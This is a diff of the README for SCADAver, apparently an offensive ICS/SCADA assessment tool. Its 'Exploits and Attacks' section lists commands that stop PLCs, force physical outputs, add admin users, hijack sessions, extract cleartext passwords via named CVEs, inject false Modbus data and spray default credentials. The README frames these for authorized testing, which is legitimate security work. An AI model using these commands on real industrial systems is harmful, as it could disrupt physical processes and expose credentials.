+# Single command (TypeID 45 — C_SC_NA_1)
+scadaver -i 10.0.0.90 set sc 1001 on
+scadaver -i 10.0.0.90 set sc 1001 off
+
+# Double command (TypeID 46 — C_DC_NA_1)
+# States: 1=off, 2=on, 3=indeterminate
+scadaver -i 10.0.0.90 set dc 2001 2
+scadaver -i 10.0.0.90 set dc 2001 1
+```
+
+### SNMP SET
+
+```sh
+# Requires a write community string. --confirm flag is mandatory.
+scadaver -i 10.0.0.110 set oid 1.3.6.1.2.1.1.6.0 "Server Room A" \
+    --community private --confirm
+
+scadaver -i 10.0.0.110 set oid 1.3.6.1.2.1.1.3.0 42 \
+    --community private --type int --confirm
+```
+
+## Exploits and Attacks
+
+> [!CAUTION]
+> The techniques in this section can crash devices, disrupt physical processes, expose credentials, or permanently alter controller configuration. Run them only against systems you own or have explicit written authorization to test.
+
+### Beckhoff CX9020 — CVE-2015-4051 (ICSA-15-258-03)
+
+Unauthenticated UPnP SOAP commands against the CX config service on TCP 5120:
+
+```sh
+# Reboot the controller immediately
+scadaver -i 10.0.0.20 run reboot
+
+# Add an administrator-level user account
+scadaver -i 10.0.0.20 run add-user operator:Password1
+
+# Write raw bytes to a named ADS symbol without authentication
+scadaver -i 10.0.0.20 run write-symbol MAIN.valve=01
+scadaver -i 10.0.0.20 run write-symbol MAIN.pump_speed=05DC
+```
+
+### Schneider Electric — FC90 Unauthenticated PLC Control
+
+Modbus function code 0x5A (proprietary Schneider) requires a 30-frame init sequence on M340/Quantum/Premium; TM221 uses a shorter path:
+
+```sh
+# Stop M340, Quantum, or Premium (no authentication)
+scadaver -i 10.0.0.30 run fc90-stop
+
+# Start M340, Quantum, or Premium
+scadaver -i 10.0.0.30 run fc90-start
+
+# Stop TM221 (SoMachine Basic)
+scadaver -i 10.0.0.30 run fc90-stop --model tm221
+
+# Force a physical output bit (On / Off / Unforce)
+scadaver -i 10.0.0.30 run fc90-force --output 0x11 --state on
+scadaver -i 10.0.0.30 run fc90-force --output 0x11 --state unforce
+```
+
+### Schneider Electric — LED Flash
+
+Sends a Unity Pro identification packet to UDP 27127, causing the identification LED to flash on Modicon M340, M580, Quantum, and Premium devices. Useful for confirming physical identity of a device during an assessment:
+
+```sh
+scadaver -i 10.0.0.30 run flash-led
+```
+
+### Schneider Electric — Session Hijack
+
+Reads `/usr/Syslog/FwLog.txt` from the embedded web server, extracts the active session cookie from "Firmware core2" log lines, then uses the cookie to issue start/stop commands without credentials:
+
+```sh
+# Step 1: retrieve and display the session cookie
+scadaver -i 10.0.0.30 get session
+
+# Step 2: use the hijacked session to stop or start the PLC
+scadaver -i 10.0.0.30 run session-stop
+scadaver -i 10.0.0.30 run session-run
+```
+
+### eWON — CVE-2019-9015 (ICSA-19-099-01)
+
+Retrieves all user accounts including cleartext passwords from the credential store via an unauthenticated POST to `/wrcgi.bin/wsdReadForm`. Passwords are XOR-obfuscated in the firmware; SCADAver decodes them automatically:
+
+```sh
+scadaver -i 10.0.0.80 run ewon-creds
+scadaver -i 10.0.0.80 run ewon-creds --max-users 50
+
+# Same operation via the get subcommand
+scadaver -i 10.0.0.80 get creds
+scadaver -i 10.0.0.80 get creds --max-users 50
+```
+
+Returns: username, first name, last name, plaintext password, access rights level.
+
+### Phoenix Contact WebVisit — CVE-2016-8366
+
+Retrieves passwords from the WebVisit HMI project file (`.teq`). The file is served unauthenticated and contains both cleartext and hashed entries:
+
+```sh
+scadaver -i 10.0.0.70 run passwords
+```
+
+Returns: user level, cleartext password, 64-character hex hash.
+
+### Modbus False Data Injection (SCASS §6.3.1)
+
+Continuously overwrites a Modbus register or coil to inject a forged value. Runs until `Ctrl-C` or `--count` is reached:
+
+```sh
+# Inject register 100 = 500 every 2 seconds (default interval), indefinitely
+scadaver -i 10.0.0.30 run fdi --address 100 --value 500
+
+# Inject a coil ON every second
+scadaver -i 10.0.0.30 run fdi --address 5 --value 1 --target coil --interval 1
+
+# Run exactly 100 write cycles then exit
+scadaver -i 10.0.0.30 run fdi --address 100 --value 9999 --count 100
+
+# Slower injection with a long inter-write gap
+scadaver -i 10.0.0.30 run fdi --address 0 --value 0 --interval 30
+```
+
+### Rogue Modbus TCP Server
+
+Binds locally and impersonates a Modbus slave with fixed responses. Useful for man-in-the-middle scenarios, HMI testing, and historian deception. Does not require `-i`:
+
+```sh
+# Serve register=42 and coil=ON on port 502
+scadaver run modbus-server --port 502 --reg-value 42 --coil-value 1
+
+# Serve zeroed registers on an unprivileged port
+scadaver run modbus-server --port 5020 --reg-value 0 --coil-value 0
+```
+
+The server handles FC1 (coils), FC3 (holding registers), and silently ACKs FC5/FC6/FC16 writes. All other function codes return Modbus exception 0x01.
+
+### HTTP Default Credential Spray
+
+Tries 72 ICS-specific username/password pairs against an HTTP Basic Auth endpoint. Custom wordlists are tried before the built-in defaults:
+
+```sh
+scadaver -i 10.0.0.50 run default-creds
+scadaver -i 10.0.0.50 run default-creds --path /config --http-port 8080
+scadaver -i 10.0.0.50 run default-creds --wordlist /path/to/creds.txt
+```
+
+Wordlist format: one `username:password` pair per line, `#` for comments.
+
+### Shellshock Scanner — CVE-2014-6271
+
+Tests CGI endpoints on PLC and HMI web servers for the Bash environment injection vulnerability:
+
+```sh
+scadaver -i 10.0.0.50 run shellshock
+scadaver -i 10.0.0.50 run shellshock --http-port 8080
+```
+
+## MQTT Assessment
+
+### Broker Scan and Recon
+
+```sh
+# Passive probe: anonymous CONNECT, $SYS subscribe, Sparkplug B detection
+scadaver -i 10.0.0.60 --protocol mqtt scan
+```
+
+Returns: anonymous access, first `$SYS/broker/*` topic and value, and whether Sparkplug B traffic was observed on `spBv1.0/#`.
+
+### Interactive Shell
+
+```sh
+scadaver mqtt
+scadaver mqtt --host 10.0.0.60
+scadaver mqtt --host 10.0.0.60 --port 8883
+```
+
+After connecting, available commands include:
+
+| Command | Purpose |
+| --- | --- |
+| `subscribe <topic>` | Subscribe at QoS 0 |
+| `unsubscribe <topic>` | Unsubscribe |
+| `publish <topic> <payload>` | Publish a message |
+| `acl-probe <topic>` | Test ACL wildcard variants via SUBACK return codes |
+| `acl-hunt` | Wildcard subscribe + automatic payload classification |
+| `creds <user> <pass>` | Test one credential pair |
+| `sparkplug-fuzz` | Launch the guarded Sparkplug B fuzzer |
+
+#### ACL Probing
+
+`acl-probe` expands a topic into all meaningful wildcard variants:
+
+- Exact topic: `factory/line1/motor`
+- Single-level wildcards: `factory/+/motor`, `+/line1/motor`, `factory/line1/+`
+- Multi-level wildcards: `#`, `factory/#`, `factory/line1/#`
+
+It subscribes to each in turn and reports the SUBACK return code (granted vs. refused).
+
+#### Payload Classification
+
+The `acl-hunt` command subscribes broadly and classifies every received message:
+
+| Tag | Detection rule |
+| --- | --- |
+| `sparkplug-b` | Topic starts with `spBv1.0/` or `spAv1.0/` — payload shown as hex |
+| `json` | UTF-8, trimmed string starts with `{` or `[` |
+| `number` | Parses as `f64` |
+| `bool` | Case-insensitive `true` or `false` |
+| `text` | Printable ASCII only |
+| `binary` | Non-UTF-8 payload |
+
+Messages flagged as sensitive are highlighted separately. Sensitivity triggers on JWT headers (`eyJ`), and keyword matches in topic or payload for `password`, `token`, `secret`, `credential`, `apikey`, and variants.
+
+### Sparkplug B Fuzzer
+
+The fuzzer is launched from within the MQTT shell. It requires a typed `YES` confirmation, enforces a minimum 50 ms delay between every published message, uses QoS 0 and `retain=false` throughout, and publishes a cleanup NDEATH on exit. Run `--dry-run` first to preview what will be sent without transmitting anything.
+
+| Category | Risk | Description |
+| --- | --- | --- |
+| `topic` | LOW | 34 cases: case variations on `spBv1.0`, wrong version strings, missing segments, extra slashes, unknown message types, long node/group segments, encoding tricks, `STATE/` variants, `$` system topics |
+| `sequence` | LOW | 13 seq values: 0, 1, 127, 255, 256 (rollover point), back to 0, gap skip, backwards, duplicate, 65535, 2³²-1, u64::MAX, u64::MAX-1 |
+| `malformed` | MEDIUM | 16 corrupt protobuf payloads: empty, null bytes, 0xFF, truncated varint, overlong varint, wrong wire type, unknown high field number, valid-then-garbage, all-zero and all-0xFF 64-byte blobs, bit-flipped valid payload, truncated valid payload, three deterministic pseudo-random sizes (16/64/256 bytes) |
+| `boundary` | MEDIUM | Int8/16/32 and UInt8/16/32/64 boundary and overflow values; string injection payloads covering format strings, SQLi, XSS, path traversal, command injection, ANSI escape; `is_null=true` with a value set |
+| `ordering` | MEDIUM | DDATA before NBIRTH, double NBIRTH without NDEATH, NDEATH then DDATA, DBIRTH without NBIRTH, rapid lifecycle churn (three NBIRTH/NDEATH cycles) |
+
+Targeted spoofing (opt-in via `--probe-write`, second `YES` required): for each node discovered during passive listening, sends NDEATH, waits 500 ms, then sends NBIRTH and NCMD Rebirth. If a device was discovered under the node, also sends DDEATH and DBIRTH for that device.
+
+## Configuration and Local Data
+
+SCADAver stores configuration under the operating system's standard configuration directory in a `scadaver` folder. Typical locations are `~/.config/scadaver` on Linux and `%APPDATA%\scadaver` on Windows.
+
+Launching the TUI creates commented sample configuration and credential files when they do not already exist:
+
+```text
+scadaver/
+├── config.toml
+├── creds.toml
+└── devices.db
+```
+
+`config.toml` supports network defaults and web settings:
+
+```toml
+[defaults]
+timeout = 5
+stealth = false
+
+[web]
+host = "127.0.0.1"
+port = 8888
+# api_key = "replace-with-a-long-random-value"
+```
+
+`creds.toml` accepts operator-supplied Siemens passwords and HTTP Basic credential pairs. These entries are tried before the built-in defaults and should contain lab-specific test credentials, not unrelated production secrets:
+
+```toml
+[siemens]
+passwords = ["", "SIMATIC", "step7"]
+
+[http]
+credentials = [
+    ["admin", "admin"],
+    ["Administrator", "1234"],
+]
+```
+
+CLI flags take precedence over configuration values. The MQTT section is present in the sample configuration, but MQTT port, TLS, and protocol selection are controlled through the MQTT interfaces rather than applied as global startup defaults.
+
+## Embedded Research References
+
+The binary embeds roughly 300 publicly disclosed ICS security writeups sourced from [awesome-ics-writeups](https://github.com/neutrinoguy/awesome-ics-writeups), including research from Claroty, ZDI, Nozomi Networks, Microsoft, Dragos, and others.
+
+```sh
+scadaver db refs
+scadaver db refs siemens
+scadaver db refs schneider
+scadaver db refs modbus
+scadaver db refs malware       # ICS malware writeups (TRITON, Industroyer, etc.)
+scadaver db refs ics-general   # OT-specific general research
+```
+
+Valid vendor slugs: `beckhoff`, `siemens`, `schneider`, `rockwell`, `mitsubishi`, `omron`, `phoenix`, `ewon`, `modbus`, `iec104`, `enip`, `snmp`, `malware`, `ics-general`, `general`.
+
+Use `B` in the TUI to view references associated with the selected device. Refresh the embedded source data during development with:
+
+```sh
 python scripts/fetch_refs.py
 ```
 
----
-
-## Test Environments
-
-- **PyScada** - Django-based SCADA with Modbus, OPC-UA, historian, and HMI: <https://pyscada.readthedocs.io/en/main/>
-- **Pump Station Simulator** - live Modbus TCP registers from a pump-station ladder logic sim: <https://github.com/dscioli/pump-station-simulator>
-
-Local protocol stubs for offline regression testing (`sim/` directory):
+## Database
 
 ```sh
-python sim/run_all.py --profile high    # start all simulators on unprivileged ports
-python sim/smoke.py                     # smoke test against them
+# Add a device manually
+scadaver db add --ip 10.0.0.50 --vendor siemens
+
+# Remove a device by database ID
+scadaver db remove --id 3
+
+# Import hosts from nmap XML output (-oX)
+scadaver import --nmap lab-scan.xml
+
+# Export the device database
+scadaver export --format json
+scadaver export --format csv --output devices.csv
 ```
 
-Use `--profile canonical` for standard protocol ports (requires Administrator/root for ports 80, 102, 502).
+## Testing
 
----
+Run the Rust unit, API, and loopback integration tests with:
+
+```sh
+cargo test --all-features
+```
+
+The simulator suite provides protocol stubs on unprivileged ports by default:
+
+```sh
+python sim/run_all.py --profile high
+python sim/smoke.py --profile high
+```
+
+Start selected simulators with `--only`, for example:
+
+```sh
+python sim/run_all.py --profile high --only modbus siemens mqtt
+```
+
+Use `--profile canonical` for standard protocol ports. Administrator or root privileges may be required for ports below 1024. Additional CI simulators and in-process loopbacks cover BACnet, DNP3, OPC UA, SNMP, Modbus, and the remaining protocol clients.
+
+Useful external lab targets include:
+
+- [PyScada](https://pyscada.readthedocs.io/en/main/), a Django-based SCADA stack with Modbus, OPC UA, historian, and HMI components
+- [Pump Station Simulator](https://github.com/dscioli/pump-station-simulator), a Modbus TCP pump-station ladder-logic simulator
 
 ## Library Usage
 
-`scadaver` is both a binary and a library crate. When used as a dependency, all
-CLI and TUI deps (ratatui, clap, rusqlite, axum, etc.) are automatically excluded
-only the pure protocol stack is compiled.
+Disable default features to compile only the synchronous protocol library:
 
 ```toml
 [dependencies]
-# library only zero CLI/TUI overhead
 scadaver = { version = "1", default-features = false }
+```
 
-# library + derive macro
+Enable the derive macro when converting vendor structs into the unified `DeviceInfo` type:
+
+```toml
+[dependencies]
 scadaver = { version = "1", default-features = false, features = ["macros"] }
 scadaver-macros = "1"
 ```
 
-Scan a Rockwell device and read tags:
+### Multi-protocol sweep
+
+```rust
+use scadaver::prelude::*;
+
+set_stealth(true);
+
+for outcome in sweep("192.168.1.100", 8) {
+    if let Some(device) = outcome.device {
+        println!("[{}] {}: {:?}", device.vendor, device.ip, device.fields);
+    }
+}
+```
+
+### Rockwell tags
 
 ```rust
 use scadaver::vendors::rockwell::driver;
@@ -299,117 +925,100 @@ println!("{}: {}", device.product_name, device.revision);
 let tags = driver::enumerate_tags("192.168.1.50", 44818)?;
 for tag in &tags {
     let value = driver::read_tag("192.168.1.50", 44818, &tag.name)?;
-    println!("{} = {}", tag.name, driver::decode_value(tag.tag_type, &value, None));
+    println!("{} = {}", tag.name, driver::decode_value(tag.tag_type, &value, &Default::default()));
 }
 ```
 
-Multi-protocol sweep using the prelude:
+### Modbus TCP
 
 ```rust
-use scadaver::prelude::*;
+use scadaver::core::modbus;
 
-set_stealth(true);
-for outcome in sweep("192.168.1.100", 8) {
-    if let Some(info) = outcome.device {
-        println!("[{}] {} — {:?}", info.vendor, info.ip, info.fields);
+let regs = modbus::read_holding_registers("192.168.1.30", 502, 0, 10)?;
+for r in regs {
+    println!("{}: {} (raw {})", r.display_address, r.value_str, r.raw);
+}
+
+modbus::write_single_register("192.168.1.30", 502, 100, 1234)?;
+modbus::write_single_coil("192.168.1.30", 502, 5, true)?;
+```
+
+### SNMP
+
+```rust
+use scadaver::vendors::snmp::{client, oids};
+
+let community = client::discover_community("192.168.1.110", 161);
+if let Some(c) = community {
+    let descr = client::get("192.168.1.110", 161, &c, oids::SYS_DESCR)?;
+    println!("{}", descr.display());
+    for (oid, val) in client::walk("192.168.1.110", 161, &c, "1.3.6.1.2.1.2")? {
+        println!("{} = {}", oid, val.display());
     }
 }
 ```
 
-Query the embedded ICS reference database:
+### MQTT session
 
 ```rust
-use scadaver::references;
+use scadaver::vendors::mqtt::session::{ConnectOptions, MqttSession};
+use std::time::Duration;
 
-for r in references::for_vendor("siemens") {
-    println!("[{}] {} | {}", r.source, r.title, r.url);
+let opts = ConnectOptions {
+    host: "10.0.0.60".into(),
+    port: 1883,
+    client_id: "my-scanner".into(),
+    ..ConnectOptions::default()
+};
+let mut session = MqttSession::connect(&opts)?;
+session.subscribe("factory/#", 0)?;
+std::thread::sleep(Duration::from_secs(2));
+for msg in session.drain_messages() {
+    println!("[{}] {}", msg.topic, msg.payload_str());
 }
+session.disconnect()?;
 ```
-
-### `#[derive(IntoDeviceInfo)]`
-
-The companion `scadaver-macros` crate provides a derive macro that converts any
-vendor device struct into the unified `DeviceInfo` type used by the sweep engine:
-
-```rust
-use scadaver_macros::IntoDeviceInfo;
-use scadaver::core::autodetect::IntoDeviceInfo as _;
-
-#[derive(IntoDeviceInfo)]
-#[vendor(slug = "acme")]
-pub struct AcmeDevice {
-    #[device_info(ip)]          // becomes DeviceInfo::ip
-    pub ip: String,
-    pub firmware: String,
-    #[device_info(rename = "hw_rev")]
-    pub hardware_revision: String,
-    #[device_info(optional)]    // Option<T> — only inserted when Some
-    pub serial: Option<String>,
-    #[device_info(skip)]        // excluded from DeviceInfo::fields
-    pub _socket: std::net::TcpStream,
-}
-
-// Generated:
-// impl IntoDeviceInfo for AcmeDevice {
-//     const VENDOR_SLUG: &'static str = "acme";
-//     fn into_device_info(self) -> DeviceInfo { ... }
-// }
-
-let info: DeviceInfo = my_device.into_device_info();
-```
-
-Field attributes: `ip`, `skip`, `rename = "key"`, `optional`.
-Struct attribute: `#[vendor(slug = "...")]`.
 
 ### Public namespaces
 
-| Namespace | Protocols |
-|-----------|-----------|
-| `scadaver::vendors::schneider` | Modbus TCP, FC90, UDP discovery |
-| `scadaver::vendors::siemens` | S7Comm / ISO-on-TCP |
-| `scadaver::vendors::beckhoff` | ADS/AMS, TwinCAT, CX webcontrol |
+| Namespace | Coverage |
+| --- | --- |
+| `scadaver::vendors::bacnet` | BACnet/IP discovery and property reads |
+| `scadaver::vendors::beckhoff` | ADS/AMS, TwinCAT, and CX web control |
+| `scadaver::vendors::dnp3` | DNP3 detection, attributes, and integrity reads |
+| `scadaver::vendors::enip` | EtherNet/IP discovery and enumerations |
+| `scadaver::vendors::ewon` | eWON IPCONF scanning and HTTP validation |
+| `scadaver::vendors::iec104` | IEC 60870-5-104 client sessions |
 | `scadaver::vendors::mitsubishi` | SLMP / MC Protocol 3E |
-| `scadaver::vendors::omron` | FINS TCP/UDP |
-| `scadaver::vendors::rockwell` | EtherNet/IP + CIP |
-| `scadaver::vendors::enip` | EtherNet/IP enumerations |
-| `scadaver::vendors::ewon` | eWON HTTP exploit + IPCONF scan |
-| `scadaver::vendors::phoenix` | ProConOS binary, WebVisit HMI |
-| `scadaver::vendors::snmp` | SNMPv1/v2c client, OID constants |
-| `scadaver::vendors::iec104` | IEC 60870-5-104 client session |
+| `scadaver::vendors::mqtt` | MQTT probing, sessions, attacks, and Sparkplug tooling |
+| `scadaver::vendors::omron` | FINS TCP and UDP |
+| `scadaver::vendors::opcua` | OPC UA Binary endpoint discovery |
+| `scadaver::vendors::phoenix` | ProConOS and WebVisit |
+| `scadaver::vendors::rockwell` | EtherNet/IP and CIP tag operations |
+| `scadaver::vendors::schneider` | Modbus TCP, FC90, and Schneider discovery |
+| `scadaver::vendors::siemens` | S7Comm / ISO-on-TCP |
+| `scadaver::vendors::snmp` | SNMP client, enumeration, and OID constants |
+| `scadaver::core::autodetect` | Unified sweep engine and stealth mode |
 | `scadaver::core::modbus` | Raw Modbus TCP client primitives |
-| `scadaver::core::autodetect` | Multi-protocol sweep, stealth mode |
-| `scadaver::core::network` | Interface enumeration, broadcast sockets |
-| `scadaver::core::bytes` | Hex/IP utility functions |
-| `scadaver::references` | Embedded ICS vulnerability reference database |
-| `scadaver::prelude` | Common re-exports (`DeviceInfo`, `sweep`, vendor result types) |
+| `scadaver::core::network` | Interface enumeration and broadcast sockets |
+| `scadaver::references` | Embedded ICS research database |
+| `scadaver::prelude` | Common device types, sweep functions, and result types |
 
----
+The optional `scadaver-macros` crate provides `#[derive(IntoDeviceInfo)]` with `ip`, `skip`, `rename`, and `optional` field attributes. See `tests/macros_derive.rs` for complete examples.
 
-## Legal
+## Responsible Use and License
 
-This tool is for authorized penetration testing, red team exercises, ICS security
-research, and CTF competitions only. Unauthorized use against systems you do not own
-or have explicit written permission to test is illegal in most jurisdictions.
+SCADAver is intended for authorized penetration tests, red team exercises, OT security research, controlled training labs, and CTF competitions. Unauthorized use against systems you do not own or have explicit permission to test may be illegal and may create physical safety risks.
 
-The authors assume no liability for misuse.
+The authors assume no liability for misuse. See the [PolyForm Noncommercial License 1.0.0](LICENSE) for the project's licensing terms.
 
+## Author
 
-# Authors:
-- [Sawyer (Saif Yaseen)](https://github.com/SawyersPresent)
-
----
+- [Saif "Sawyer" Yaseen](https://github.com/SawyersPresent)
 
 ## Credits
 
-- **[mqttui](https://github.com/EdJoPaTo/mqttui)** — MQTT topic browser UI and live message
-  display patterns informed the TUI monitor view and topic table design in `src/tui.rs`.
-- **[Sparkplug Fuzzer](https://github.com/timzaak/sparkplug-fuzzer)** — Sparkplug B protocol
-  fuzzing approach, category structure, and several payload construction patterns were adapted
-  for `src/vendors/mqtt/sparkplug_fuzz.rs`.
-- **[python-mqtt-client-shell](https://github.com/bapowell/python-mqtt-client-shell)** by
-  Barry Powell — interactive MQTT shell design and command-loop patterns informed
-  `src/mqtt_shell.rs`.
-- **[HackTricks MQTT Pentesting Guide](https://hacktricks.wiki/en/network-services-pentesting/1883-pentesting-mqtt-mosquitto.html)**
-  — ACL wildcard probing, session-hijack via `clean_session=false`, and retained-message
-  enumeration techniques are drawn from this guide and implemented in
-  `src/vendors/mqtt/attacks.rs` and the shell/TUI attack commands.
+- **[mqttui](https://github.com/EdJoPaTo/mqttui)**: topic-browser and live-message display patterns informed the TUI monitor view and topic table in `src/tui.rs`.
+- **Sparkplug Fuzzer by timzaak**: the Sparkplug B fuzzing approach, category structure, and payload patterns informed `src/vendors/mqtt/sparkplug_fuzz.rs`. The original public repository link is no longer available.
+- **[python-mqtt-client-shell](https://github.com/bapowell/python-mqtt-client-shell)** by Barry Powell: its interactive shell and command-loop design informed `src/mqtt_shell.rs`.
+- **[HackTricks MQTT Pentesting Guide](https://hacktricks.wiki/en/network-services-pentesting/1883-pentesting-mqtt-mosquitto.html)**: ACL wildcard, stored-session, and retained-message assessment techniques informed `src/vendors/mqtt/attacks.rs` and the MQTT interfaces.
